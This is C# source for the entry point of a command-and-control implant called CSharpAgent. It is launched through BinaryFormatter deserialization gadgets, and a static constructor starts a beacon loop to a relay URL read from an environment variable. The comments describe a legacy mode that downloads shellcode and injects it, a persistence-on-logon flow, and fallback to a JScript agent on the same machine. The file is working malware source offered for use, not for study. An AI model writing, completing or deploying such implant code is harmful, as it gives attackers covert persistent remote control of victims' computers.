using System;
using System.Runtime.InteropServices;
using System.Net;

namespace CSharpAgent
{
    // The deserialization entry point (COM-visible so the C2-delivered BinaryFormatter gadgets
    // can instantiate the type; the static constructor fires on Activator.CreateInstance /
    // CreateInstance(entryClass) — both instantiation forms run it). MUST stay the FIRST public
    // type in the merged source: the C2's entry-class finder takes the first public class, and
    // the promotion pass moves it after <Module> for the GetTypes()[0] gadgets.
    //
    // Dual-mode dispatch, decided by the process environment the host left us:
    //
    //   H_URL set → agent mode. Beacon.Run() parks THIS thread in the beacon loop and never
    //               returns on its own — the deserialization that started us (a 0x0B UpgradeNetFramework
    //               delivered to the JScript agent sharing this machine) never resumes its own
    //               loop, so exactly one agent beacons the shared MachineGuid session from here
    //               on. Run returns only on a fatal transport failure, unwinding back into the
    //               JScript agent underneath (which then resumes beaconing as the fallback).
    //   A_URL set → legacy one-shot injector: download the PIC bytes and inject them (the
    //               Persistence Manager's on-logon flow depends on this path — it sets A_URL
    //               and deserializes the same assembly).
    //   neither   → return. Standalone builds carry nothing baked (see C2Payload).
    [ComVisible(true)]
    public class Program
    {
        static Program()
        {
            Main();
        }

        // The release EXE builds (csharp-agent-<net2|net4>-<arch>.exe siblings of the DLLs)
        // reach this type through the runtime entry point, which calls Main AFTER the static
        // ctor already did — without the guard a direct run would execute the body twice.
        // The ctor's call is the ONLY entry the deserialization path has (a Library has no
        // managed entry point), so both forms share the body; the guard makes it run exactly
        // once either way.
        static bool _entered;

        static void Main()
        {
            if (_entered) return;
            _entered = true;

            // [1] — proves the type initialized and the body is running (exe entry OR
            // deserialization ctor; if a Win7 run dies BEFORE this box, the failure is in
            // type init itself — JIT/permission/mask — not in the beacon).
            Diag.Show("[1] start", "process started — type initialized, Main entered");

            var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
            if (string.IsNullOrEmpty(beaconUrl))
            {
                // [exit] — the silent exit most likely behind "runs then exits": the exe
                // was launched without H_URL in its environment.
                Diag.Show("[exit] no H_URL",
                    "H_URL is not set — nothing to beacon, returning.\n" +
                    "Launch from a shell that has it:\n" +
                    "  set H_URL=https://<relay>/ && csharp-agent-<net2>-<arch>.exe");
                return;
            }
            Diag.Show("[2] H_URL", beaconUrl);

            Beacon.Run(beaconUrl);
            Diag.Show("[exit] Run returned",
                "Beacon.Run returned — a fatal transport/protocol exit (see the last " +
                "[exit] caption above this one, if any). Process ends; the JScript agent " +
                "underneath resumes when this run was a deserialization.");
        }
    }
}
